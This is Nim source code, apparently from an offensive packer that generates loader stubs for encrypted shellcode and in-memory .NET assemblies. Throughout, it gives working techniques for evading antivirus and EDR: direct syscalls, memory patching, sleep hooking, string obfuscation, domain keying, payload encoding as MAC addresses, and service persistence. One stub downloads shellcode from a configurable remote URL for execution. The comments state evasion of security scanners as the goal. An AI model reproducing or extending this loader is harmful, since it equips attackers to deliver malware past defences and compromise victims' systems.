  var randValues: string = rndStr(rand(50..500))
  let randstub = fmt"""

    var {randName}: string = obf("{randValues}")


"""
  return randstub

proc getRandStubNoTab (): string =
  var randName: string = rndStr(rand(10..25))
  var randValues: string = rndStr(rand(50..500))
  let randstub = fmt"""

var {randName}: string = obf("{randValues}")


"""
  return randstub

let PatchargsFuncs = fmt"""
    var arguments: string = "{arguments}"
    when defined(args):
        proc patchMemory(targetAddr: PVOID, data: openArray[byte]): void =
            var oldProtect: DWORD = 0
            var lpAddress = targetAddr
            var dwSize = cast[SIZE_T](len(data))
            var status: NTSTATUS = 0x00000000
            var hProcess = -1
            when defined(Syswhispers):
                status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                when defined(verbose):
                    echo obf("NtProtectVirtualMemory: "),toHex(status)
                if (status != 0):
                    when defined(verbose):
                        echo obf("[-] Failed to change memory protections.")
                    when defined(verbose):
                        echo toHex(status)
            else:
                when defined(HellsGate):
                    if getSyscall(ntProtectTable):                
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                if (status != 0):
                    echo obf("[-] Failed to change memory protections.")
                    echo toHex(status)
                
            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            var scLength: SIZE_T = SIZE_T(len(data))
            var bytesWritten: SIZE_T
                
            when defined(Syswhispers):
                status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
            else:
                status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
                echo obf("NtWriteVirtualMemory: "),toHex(status)
                if (status != 0):
                    echo obf("[-] Failed to write arguments.")
                    echo toHex(status)
                else:
                    echo obf("[+] Arguments written successfully.")
            when defined(Syswhispers):
                status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
            else:
                when defined(HellsGate):
                    if getSyscall(ntProtectTable):                
                        syscall = ntProtectTable.wSysCall
                    else:
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
    when defined(args):
        proc patchArgFunctionMemory(funcAddr: pointer, pNewCommandLine: pointer): void =
            when defined x86:
                var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
            else:
                var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
            for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
                shellcode.add t        
            shellcode.add(byte(0xc3)) # ret
            patchMemory(funcAddr, shellcode)
"""





let LoadAssemblyStub = fmt"""



    # Actually decrypt after doing everything else for better evasion.
    ptrEncText = cast[ptr byte](addr enctext[0])
    ptrDecText = cast[ptr byte](addr dectext[0])
    decryptlate()
    discard calcHard()
    var assembly = load(dectext)
    discard calcHard()

    when defined(lib_only):
        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
        AttachConsole(-1)

    when defined(Fluctuate):
        g_fluctuationData.shellcodeAddr = dectext[0].addr
        g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
        # Will change the hardcoded key later on
        when defined(amd64):
            g_fluctuationData.encodeKey = 0x1337DE4D
        when defined(i386):
            g_fluctuationData.encodeKey = 0x1337
        g_fluctuationData.currentlyEncrypted = false
        g_fluctuationData.protect = PAGE_READWRITE
        g_fluctuate = FluctuateToRW
        if (hookSleep()):
            when defined(verbose):
                echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
        else:
            when defined(verbose):
                echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

    var cmd: seq[string]
    var i = 1
    discard calcHard()
    when defined(args):
        cmd.add({arguments.split(" ")})
    while i <= paramCount():
        discard calcHard()
        when defined(lib_only):
            if (i != 1):
                # first parameter is rundll32.exe,Funcname (skip that)
                cmd.add(paramStr(i))
        else:
            cmd.add(paramStr(i))
        inc(i)
"""

let LoadAssemblyStubArgs = """
    var arr = toCLRVariant(cmd, VT_BSTR)
    discard calcHard()
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
    discard calcHard()

when defined(defaultMain):
    when not defined(service):
        when defined(notcloned):
            when not defined(proxy):
                discard main(nil)
"""

let LoadAssemblyStubNoArgs = """
    discard calcHard()
    var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
    discard calcHard()
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

when not defined(proxy):
    when not defined(service):
        when not defined(cloned):
            discard main(nil)

when defined(defaultMain):
    when not defined(service):
        when defined(notcloned):
            discard main(nil)
"""


let SleepStubSecond * = fmt"""
when defined(verbose):
    echo obf("[*] Sleeping to avoid in memory scanners")
when defined(verbose):
    echo {sleeptime}
HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
"""

let DomainCheckStub1 * = fmt"""
when isMainModule:
    var localdomain: string = getDomain()
    if(localdomain != "{targetdomain}"):
        when defined(verbose):
            echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
        quit()
"""

let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
    var remoteprocesses: seq[string] = {remoteprocesses}
"""

let ShellcodeFromFileStub * = fmt"""

    var fileHandle: File
    var encString: string
    for f in {shellcodeFile}:
        try:
            fileHandle = open(f, fmRead)
            encString = fileHandle.readAll()
            break
        except:
            when defined(verbose):
                echo obf("[-] Failed to open file: ") & f
    var enctext: seq[byte] = toByteSeq(encstring)
    var dectext = newSeq[byte](len(enctext))

"""

let ServiceDllStub * = """

const
  SVCNAME* = obf("PackerService")

var serviceStatus*: SERVICE_STATUS

var serviceStatusHandle*: SERVICE_STATUS_HANDLE

var stopEvent*: HANDLE

proc UpdateServiceStatus*(currentState: DWORD): VOID =
  serviceStatus.dwCurrentState = currentState
  SetServiceStatus(serviceStatusHandle, addr(serviceStatus))

proc ServiceHandler*(controlCode: DWORD; eventType: DWORD; eventData: LPVOID;
                    context: LPVOID): DWORD =
  case controlCode
  of SERVICE_CONTROL_STOP:
    serviceStatus.dwCurrentState = SERVICE_STOPPED
    SetEvent(stopEvent)
  of SERVICE_CONTROL_SHUTDOWN:
    serviceStatus.dwCurrentState = SERVICE_STOPPED
    SetEvent(stopEvent)
  of SERVICE_CONTROL_PAUSE:
    serviceStatus.dwCurrentState = SERVICE_PAUSED
  of SERVICE_CONTROL_CONTINUE:
    serviceStatus.dwCurrentState = SERVICE_RUNNING
  of SERVICE_CONTROL_INTERROGATE:
    discard
  else:
    discard
  UpdateServiceStatus(SERVICE_RUNNING)
  return NO_ERROR

proc ExecuteServiceCode*(): VOID =
  stopEvent = CreateEvent(nil, TRUE, FALSE, nil)
  UpdateServiceStatus(SERVICE_RUNNING)
  ##  #####################################
  ##  your persistence code here
  ##  #####################################
  discard main(nil)
  while (serviceStatus.dwCurrentState != SERVICE_STOP_PENDING):
    WaitForSingleObject(stopEvent, INFINITE)
    UpdateServiceStatus(SERVICE_STOPPED)
    return

proc ServiceMain*(dwArgc: DWORD, lpszArgv: ptr LPTSTR): VOID {.stdcall,exportc, dynlib.} =
    NimMain() # otherwise garbage collector and other stuff won't have initialized.
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME,
                                                     cast[LPHANDLER_FUNCTION](ServiceHandler))
    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS
    serviceStatus.dwServiceSpecificExitCode = 0
    UpdateServiceStatus(SERVICE_START_PENDING)
    ExecuteServiceCode()

"""

let ServiceStub * = """

#
#
#               nimWindowsService
#        (c) Copyright 2018 David Krause
#
#    See the file "LICENSE.txt", included in this
#    distribution, for details about the copyright.
#
## the service code
## a windows service needs to register its main function in the Service control manager
## and also report its status!

# https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-controlservice

type ServiceMain = proc(gSvcStatus: SERVICE_STATUS)

var SERVICE_NAME =  "SERVICE_NAME2_BAA".LPTSTR
var gSvcStatusHandle: SERVICE_STATUS_HANDLE
var gSvcStatus: SERVICE_STATUS 

proc reportSvcStatus*(dwCurrentState, dwWin32ExitCode, dwWaitHint: DWORD) =
    var dwCheckPoint: DWORD = 1 # TODO what is this? 
    gSvcStatus.dwCurrentState = dwCurrentState
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode
    gSvcStatus.dwWaitHint = dwWaitHint
    if dwCurrentState == SERVICE_START_PENDING:
        gSvcStatus.dwControlsAccepted = 0
    else:
        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP

    if dwCurrentState == SERVICE_RUNNING or dwCurrentState == SERVICE_STOPPED:
        gSvcStatus.dwCheckPoint = 0
    else:
        gSvcStatus.dwCheckPoint = dwCheckPoint
        dwCheckPoint.inc()
    
    # Report the status of the service to the SCM.
    echo "SetServiceStatus: " & $SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)

proc svcCtrlHandler(dwCtrl: DWORD) {.stdcall.} =
    ## Handle the requested control code. 
    case dwCtrl
    of SERVICE_CONTROL_STOP:
        # Signal the service to stop 
        # TODO we must stop OUR code somehow!
        reportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 10_000) # we think we can stop the service in 10 seconds
    of SERVICE_CONTROL_INTERROGATE:
        discard
    else:
        discard

template wrapServiceMain*(mainProc: ServiceMain): LPSERVICE_MAIN_FUNCTION = 
    ## wraps a nim proc in a LPSERVICE_MAIN_FUNCTION
    proc serviceMainFunction(dwArgc: DWORD, lpszArgv: ptr LPTSTR) {.stdcall.} =
        gSvcStatusHandle = RegisterServiceCtrlHandler(
            SERVICE_NAME,
            svcCtrlHandler
        )
        gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS
        gSvcStatus.dwServiceSpecificExitCode = 0
        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)   
        mainProc(gSvcStatus) # call the wrapped proc
        reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!
    serviceMainFunction


when isMainModule:
    import times, os
    proc serviceMain(gSvcStatus: SERVICE_STATUS) =
        ## a service main
        ## use gScvStatus to check if we should stop periodically!
        #reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
        discard main(nil)
        #var onlyOnce: bool = true
        #sleep(5000)
        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
        #sleep(5000)
        while gSvcStatus.dwCurrentState != SERVICE_STOP_PENDING:
            sleep(1000)
        #[    reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
            if(onlyOnce):
                onlyOnce = false
                discard main(nil)
        ]#
        #reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!

    var wrapped = wrapServiceMain(serviceMain)
    var dispatchTable = [
        # SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: SvcMain),
        SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: wrapped),
        SERVICE_TABLE_ENTRY(lpServiceName: nil, lpServiceProc: nil) # last entry must be nil
    ]

    echo StartServiceCtrlDispatcher( (addr dispatchTable[0]).LPSERVICE_TABLE_ENTRY)
    while gSvcStatus.dwCurrentState == SERVICE_RUNNING:
        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
        sleep(1000)


"""

let ShellcodeFromURLStub * = fmt"""

    #[
        References:
            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_winhttp.c
            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_wininet.c
            - https://gist.github.com/henkman/2e7a4dcf4822bc0029d7d2af731da5c5
    ]#


    proc httpRequestException(msg: string) =
        raise newException(ValueError, "Error when performing HTTP request: " & $msg)

    proc safeStringSlice(n: LPCWSTR, l: DWORD): LPCWSTR =
        var
            nim_string = $n
            nim_int = l-1

        return nim_string[0..nim_int]

    proc httpGetRequest(url: string): string =
        var
            bits: URL_COMPONENTS
            flags: DWORD
            hSession, hConnect, hReq: HINTERNET
            ieConfig: WINHTTP_CURRENT_USER_IE_PROXY_CONFIG
            proxyInfo: WINHTTP_PROXY_INFO
            dwSize, dwDownloaded: DWORD = 0
            pszOutBuffer: LPSTR
            bResults: bool
            totalDownloaded: int
            dataBuffer: StringStream = newStringStream("")

        when defined(ssl):
            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE or WINHTTP_FLAG_SECURE
        else:
            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE

        when defined(verbose):
            echo obf("+ Attempting HTTP GET request to: ") & url

        hSession = WinHttpOpen(obf("PackRequest"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
        if hSession.isNil:
            when defined(verbose):
                httpRequestException(obf("Creating hSession returned an error: ") & $GetLastError())

        zeroMem(addr bits, sizeof(bits))
        bits.dwStructSize = cast[DWORD](sizeof(bits))

        bits.dwSchemeLength    = -1
        bits.dwHostNameLength  = -1
        bits.dwUrlPathLength   = -1
        bits.dwExtraInfoLength = -1

        WinHttpCrackUrl(url, 0, 0, addr bits)
        var actual_hostname = safeStringSlice(bits.lpszHostName, bits.dwHostNameLength)
        var actual_scheme = safeStringSlice(bits.lpszScheme, bits.dwSchemeLength)
        when defined(verbose):
            echo obf("* [HTTP] Scheme: "), actual_scheme
            echo obf("* [HTTP] Hostname: "), actual_hostname
            echo obf("* [HTTP] URL Path: "), bits.lpszUrlPath

        if not hSession.isNil:
            hConnect = WinHttpConnect(hSession, actual_hostname, bits.nPort, 0)

        if not hConnect.isNil:
            hReq = WinHttpOpenRequest(hConnect, "GET", bits.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)

        if WinHttpGetIEProxyConfigForCurrentUser(addr ieConfig):
            when defined(verbose):
                echo obf("* [PROXY] Got IE Configuration")
                echo obf("* [PROXY] Autodetect: "), ieConfig.fAutoDetect
                echo obf("* [PROXY] Auto URL: "), $ieConfig.lpszAutoConfigUrl
                echo obf("* [PROXY] Proxy: "), $ieConfig.lpszProxy
                echo obf("* [PROXY] Proxy Bypass: "), $ieConfig.lpszProxyBypass

            if (not ieConfig.lpszAutoConfigUrl.isNil or ieConfig.fAutoDetect.bool):
                var autoProxyOpts: WINHTTP_AUTOPROXY_OPTIONS

                if ieConfig.fAutoDetect:
                    when defined(verbose):
                        echo obf("* [PROXY] IE config set to autodetect with DNS or DHCP")
                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT
                    autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP or WINHTTP_AUTO_DETECT_TYPE_DNS_A
                    autoProxyOpts.lpszAutoConfigUrl = NULL

                elif not ieConfig.lpszAutoConfigUrl.isNil:
                    when defined(verbose):
                        echo obf("* [PROXY] IE config set to autodetect with URL "), ieConfig.lpszAutoConfigUrl

                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL
                    autoProxyOpts.dwAutoDetectFlags = 0
                    autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl

                autoProxyOpts.fAutoLogonIfChallenged = TRUE;

                WinHttpGetProxyForUrl(hSession, bits.lpszUrlPath, addr autoProxyOpts, addr proxyInfo)

            elif not ieConfig.lpszProxy.isNil:
                when defined(verbose):
                    echo obf("* [PROXY] IE config set to proxy "), ieConfig.lpszProxy, obf(" with bypass "), ieConfig.lpszProxyBypass 

                proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY
                proxyInfo.lpszProxy = ieConfig.lpszProxy
                proxyInfo.lpszProxyBypass = ieConfig.lpszProxyBypass

                ieConfig.lpszProxy = NULL
                ieConfig.lpszProxyBypass = NULL

        WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, addr proxyInfo, cast[DWORD](sizeof(WINHTTP_PROXY_INFO)))

        if not hReq.isNil:
            bResults = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)

        if bResults:
            bResults = WinHttpReceiveResponse(hReq, NULL)

        if bResults:
            while true:
                if not WinHttpQueryDataAvailable(hReq, addr dwSize).bool:
                    httpRequestException("Error in WinHttpQueryDataAvalable: " & $GetLastError())

                if dwSize == 0:
                    break

                pszOutBuffer = newString(dwSize+1)
                zeroMem(pszOutBuffer, dwSize+1)

                if not WinHttpReadData(hReq, addr pszOutBuffer[0], dwSize, addr dwDownloaded).bool:
                    httpRequestException("Error receiving data: " & $GetLastError())

                dataBuffer.writeData(addr pszOutBuffer[0], dwDownloaded)
                totalDownloaded += dwDownloaded

            when defined(verbose):
                echo obf("+ Total data received: "), totalDownloaded

            WinHttpCloseHandle(hReq)
            WinHttpCloseHandle(hConnect)
            WinHttpCloseHandle(hSession)

            dataBuffer.setPosition(0)
            return dataBuffer.readAll()

    var encString = httpGetRequest(obf("{shellcodeURL}"))
    var enctext: seq[byte] = toByteSeq(encstring)
    var dectext = newSeq[byte](len(enctext))
    

"""


let Cryptstub1 = """
import winim/lean
import strformat
from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import strutils
import ptr_math
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
#from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
#import winim/winstr
#import winim/utils
#from winim import winstr,winimbase,windef
when defined(DInvoke):
    from packerutils import MyRtlGetCurrentPeb
when defined(AntiDebug):
    from winim import LIST_ENTRY,PVOID,ULONG,UNICODE_STRING,UCHAR,BYTE,P_PEB

when defined(ProviderPatch):
    from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames

when defined(HardwareETW):
  from winim/clr import load,clrVariantToString,new,`.`,VT_BSTR,invoke

when defined(csharp):
    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR,clrVariantToString,new
    from os import paramCount,paramStr

when defined(sleep):
    import random
    import times

when defined(SelfDelete):
    # Don't want to import the everything from winim, only what's really needed
    from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
    from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
    template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
    template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = moveMemory(Destination, Source, Length)

when defined http:
    import winim/inc/winhttp
    import streams
when defined ssl:
    import winim/inc/winhttp
    import streams

when defined(Hellsgate):
    from os import paramStr
    {.passC:"-masm=intel".}
    from winlean import getCurrentProcess

when defined(remoteinject):
    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
    import osproc,os

when defined(JmpEntry):
    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS

when defined(COMVARETW):
    import osproc,os
    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA

when defined(HardwareETW):
    from winim import CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,TH32CS_SNAPTHREAD,THREADENTRY32,Thread32First,Thread32Next

when not defined(proxy):
    when defined(notcloned):
        import nimstrenc
when defined(Fluctuate):
    import Fluctuation


# We use a custom memCopy/copyMem function here, which takes two pointers and a size as input and copies the seccond pointer content into the first
proc moveMemory(dest: pointer, src: pointer, size: int) =
    var csrc: ptr char = cast[ptr char](src)
    var cdest: ptr char = cast[ptr char](dest)
    for i in 0 ..< size:
        cdest[i] = csrc[i]

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  moveMemory(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    var whatup: char
    var testString : string = " "
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            whatup = result[i]
            testString = testString & " "
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xEE))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFEE

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFEE
    else:
        result = s

when not defined(DInvoke):
    proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
        importc: obf("LdrLoadDll"), dynlib: obf("ntdll"), stdcall, discardable.}
    proc RtlAddVectoredExceptionHandler*(FirstHandler: ULONG, VectoredHandler: PVOID): PVOID {.
        importc: obf("RtlAddVectoredExceptionHandler"), dynlib: obf("ntdll"), stdcall, discardable.}

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc calcHard *(): int =
    var rand: int = 0
    for i in 0 .. 10:
        rand += 15
        if ((rand mod 9) != 0):
            rand += 15
    return rand

# we need our custom lstrlenW function here, as otherwise the compiler throws errors when going without dynlib
proc lstrlenW*(lpString: PWCHAR): int =
    var i = 0
    while lpString[i] != 0:
        inc(i)
    return i

when defined(macPayload):
    proc RtlEthernetStringToAddressA*(str: PCSTR, terminator: ptr PCSTR, targetaddr: DWORD_PTR): NTSTATUS {.importc, dynlib: "ntdll.dll".}

when defined(QueueAPC):
    when not defined(Hellsgate):
        type
            KNORMAL_ROUTINE* {.pure.} = object
                NormalContext*: PVOID
                SystemArgument1*: PVOID
                SystemArgument2*: PVOID
            PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE


# Check, if OS is Windows Server 2012, as that is different with ntdll.dll on disk and memory
var ws2k12: BOOL = 0


proc `$`(a: array[128, WCHAR]): string = $cast[WideCString](unsafeAddr a[0])

proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
    {.cdecl, importc: obf("RtlGetVersion"), dynlib: obf("ntdll.dll").}

var versionInfo: OSVersionInfoExW
echo rtlGetVersion(versionInfo)
#echo versionInfo

if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 2):
    ws2k12 = 1
    when defined verbose:
        echo obf("Windows Server 2012/Win8 detected\n")
if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 3):
    ws2k12 = 1
    when defined verbose:
        echo ("Windows Server 2012 R2/Win8 detected\n")
if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 0):
    ws2k12 = 1
    when defined verbose:
        echo obf("Windows Server 2008/Win7 detected\n")
if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 1):
    ws2k12 = 1
    when defined verbose:
        echo ("Windows Server 2008 R2/Win7 detected\n")

if(versionInfo.dwMajorVersion <= 5):
    ws2k12 = 1
    when defined verbose:
        echo ("XP/Server 2003 or old as fuck system detected, may have troubles here! \n")


"""

let macPayloadStub = fmt"""


{macPayloadString}

var rowLen: int = len(mac)
var Terminator: PCSTR
var STATUS: NTSTATUS
var alloc_mem: LPVOID

if((len(mac)*6) > 4200):
    # use the Stack, as on the HEAP we get a crash for large Shellcode
    alloc_mem = VirtualAlloc(cast[ptr uint8](nil), (len(mac)*6), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)    
else:
    # use the HEAP, that is less monitored by AV/EDR and nearly not hooked
    var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    alloc_mem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)

var directPointer: LPVOID = cast[LPVOID](alloc_mem)

when defined(verbose):
    echo obf("[*] MAC addresses to memory data conversion...")

for i in 0 ..< rowLen:
    STATUS = RtlEthernetStringToAddressA(mac[i], &Terminator, cast[DWORD_PTR](directPointer))
    if STATUS == STATUS_SUCCESS:
        directPointer += 6
    else:
        when defined(verbose):
            echo obf("Failed with Error Code: "), toHex(STATUS)

"""

let Cryptstub15 = fmt"""

when defined(AllocateDripStyle):
    var dripsleepinbetween = {dripsleepinbetween}

when defined(JmpEntry):
    var jmpMod: string = obf("{jmpEntryDLL}")
    var jmpFunc: string = obf("{jmpEntryFunction}")

when defined(SkipDefaultSandBoxChecks):
    when defined(AntiDebug):
        var envkey = obf("{firstwithoutlast4}")
        var envkey2 = envkey
    else:
        var envkey = obf("{envkey}")
        var envkey2 = obf("{envkey}")
else:
    var envkey = obf("{firstwithoutlast4}")
    var envkey2 = envkey
var ptrEncText: ptr byte
var ptrDecText: ptr byte
when defined(PayloadEmbedded):
    when defined(macPayload):
        var enctext = newSeq[byte](len(mac)*(6))
        var dectext = newSeq[byte](len(mac)*(6))
        if ((len(enctext) mod aes256.sizeBlock) != 0):
            when defined(verbose):
                echo obf("[*] Payload length not a multiple of the BlockSize: "), aes256.sizeBlock
                echo obf("[*] Length: ") & $len(enctext)
                echo obf("[*] Padding payload...")
            enctext = enctext & newSeq[byte](aes256.sizeBlock - (len(enctext) mod aes256.sizeBlock))
            dectext = dectext & newSeq[byte](aes256.sizeBlock - (len(dectext) mod aes256.sizeBlock))
            when defined(verbose):
                echo obf("[*] New Length: ") & $len(enctext)
        # Move the encrypted Shellcode into the enctext sequence
        moveMem(addr enctext[0], alloc_mem, len(enctext))
    else:
        const encstring = slurp"enc.blob"
        var enctext: seq[byte] = toByteSeq(encstring)
        var dectext = newSeq[byte](len(enctext))
"""

let Cryptstub2 = fmt"""
    var dctx: ECB[aes256]
    var success: BOOL
    when defined(sleepinbetween):
        var sleepbetweentime: int = {sleepinbetween}
    discard calcHard()
    var key: array[aes256.sizeKey, byte]
    discard calcHard()

"""

let Cryptstub3 = fmt"""
    #var envkey2 = envkey & "{lastfour}"
    
    proc decryptLate(): void =
        var expandedkey = toByteSeq(envkey2)
        discard calcHard()
        if ((int(len(expandedkey)) mod int(aes256.sizeBlock)) != 0):
            when defined(verbose):
                echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
                echo "[*] Length: " & $len(expandedkey)
                echo "[*] Padding Key with null bytes"
            expandedkey = expandedkey & newSeq[byte](aes256.sizeBlock - (len(expandedkey) mod aes256.sizeBlock))
            when defined(verbose):
                echo "[*] New Length: " & $len(expandedkey)

        moveMemory(addr key[0], addr expandedkey[0], len(expandedkey))
        discard calcHard()
        #dectext = newSeq[byte](len(enctext))

        var ptrKey = cast[ptr byte](addr key[0])

        let dataLen = uint(len(enctext))
        when defined(verbose):
            when defined(csharp):
                echo obf("[!] Decrypting C# Assembly for execution...")
            else:
                echo obf("[!] Decrypting Payload for execution in memory...\r\n")
        discard calcHard()
        dctx.init(ptrKey)
        discard calcHard()
        dctx.decrypt(cast[ptr byte](ptrEncText), cast[ptr byte](ptrDecText), dataLen)
        discard calcHard()
        dctx.clear()

"""

let Accelerated_sleepStub * = fmt"""

proc accelerated_sleep*(): void =
    var 
        dwStart: DWORD
        dwEnd: DWORD = 0
    
    when defined(DInvoke):
        dwStart = MyGetTickCount()
    else:
        dwStart = GetTickCount()

    # Lets Sleep for two seconds
